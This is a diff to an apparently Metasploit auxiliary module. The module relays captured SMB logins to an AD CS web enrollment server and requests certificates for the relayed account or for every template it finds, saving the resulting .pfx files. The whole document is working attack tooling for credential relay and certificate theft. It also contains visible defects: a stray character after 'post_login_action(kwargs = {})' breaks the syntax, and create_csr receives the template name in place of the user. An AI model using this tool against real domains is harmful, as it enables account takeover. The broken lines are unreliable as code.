@@ -27,7 +27,6 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('ALT_USER', [ true, 'The user to issue the certificate for.', 'ADMINISTRATOR' ]),
         OptString.new('CERT_TEMPLATE', [ false, 'The user to issue the certificate for.', nil ]),
         OptString.new('CERT_URI', [ true, 'The URI for the cert server.', '/certsrv/' ]),
         OptBool.new('QUERY_TEMPLATES', [ true, 'Query certificate templates and print them before attempting to use them', true ]),
@@ -57,19 +56,19 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def on_client_connect(_client)
-    @login_uri = "#{datastore['CERT_URI']}/csertfnsh.asp"
+    @login_uri = normalize_uri("#{datastore['CERT_URI']}/csertfnsh.asp")
     @http_timeout = datastore['TIMEOUT']
     print_good('Received SMB connection on Auth Capture Server!')
   end
 
   alias run exploit
 
-  def create_csr(private_key, alt_usr)
+  def create_csr(private_key, authenticated_user)
     vprint_status('Generating CSR...')
     request = OpenSSL::X509::Request.new
     request.version = 1
     request.subject = OpenSSL::X509::Name.new([
-      ['CN', alt_usr, OpenSSL::ASN1::UTF8STRING]
+      ['CN', authenticated_user, OpenSSL::ASN1::UTF8STRING]
     ])
     request.public_key = private_key.public_key
     request.sign(private_key, OpenSSL::Digest.new('SHA256'))
@@ -82,7 +81,13 @@ class MetasploitModule < Msf::Auxiliary
     return nil
   end
 
-  def post_login_action(client_socket, _opts = {})
+  def post_login_action(kwargs = {})e
+    authenticated_username = kwargs[:authenticated_username]
+    client_socket = kwargs[:client_socket]
+    if client_socket.nil? || authenticated_username.nil?
+      fail_with(Failure::BadConfig, 'Post Login Action requires an authenticated socket and username')
+    end
+    vprint_status("authenticated_username = #{kwargs[:authenticated_username]}")
     cert_list = nil
     if datastore['QUERY_TEMPLATES']
       print_status('Querying certificate templates; this may take some time')
@@ -99,14 +104,14 @@ class MetasploitModule < Msf::Auxiliary
     unless datastore['QUERY_ONLY']
       if cert_list.nil? || cert_list.include?(datastore['CERT_TEMPLATE'])
         # if we don't have a cert list or if the cert is in the list, just generate that cert
-        retrieve_cert(client_socket, datastore['CERT_TEMPLATE'], datastore['alt_user'])
+        retrieve_cert(client_socket, datastore['CERT_TEMPLATE'], authenticated_username)
       else
         # if we have a cert list and the desired template is not there
         # or the desired template is nil, just issue all available certs
         print_bad("#{datastore['CERT_TEMPLATE']} not found in available certificates") unless datastore['CERT_TEMPLATE'].nil?
         print_status('Attempting to generate certificates for all templates')
         cert_list.each do |cert_entry|
-          retrieve_cert(client_socket, cert_entry, datastore['alt_user'])
+          retrieve_cert(client_socket, cert_entry, authenticated_username)
         end
       end
     end
@@ -138,8 +143,8 @@ class MetasploitModule < Msf::Auxiliary
     return nil
   end
 
-  def retrieve_cert(client_socket, cert_template, alt_user)
-    vprint_status("Sending Post to generate certificate for #{alt_user} using the #{cert_template} template")
+  def retrieve_cert(client_socket, cert_template, authenticated_user)
+    vprint_status("Sending Post to generate certificate for #{authenticated_user} using the #{cert_template} template")
     begin
       private_key = OpenSSL::PKey::RSA.new(4096)
       request = create_csr(private_key, cert_template)
@@ -162,9 +167,9 @@ class MetasploitModule < Msf::Auxiliary
       res = client_socket._send_recv(req, @http_timeout, true)
       vprint_status('Post Sent')
       if res&.code == 200 && !res.body.include?('request was denied')
-        print_good("Certificate Request Granted using template #{cert_template} and user #{alt_user}")
+        print_good("Certificate Request Granted using template #{cert_template} and user #{authenticated_user}")
       else
-        print_bad("Certificate Request Denied using template #{cert_template} and user #{alt_user}")
+        print_bad("Certificate Request Denied using template #{cert_template} and user #{authenticated_user}")
         return false
       end
     rescue Exception => e
@@ -194,7 +199,7 @@ class MetasploitModule < Msf::Auxiliary
                                pkcs12.to_der,
                                'certificate.pfx',
                                info)
-      print_status("Certificate saved to #{stored_path}")
+      print_status("Certificate for #{authenticated_user} using template #{cert_template} saved to #{stored_path}")
     rescue Exception => e
       print_error(e.to_s)
       elog("Error getting certificate:\n #{e}")
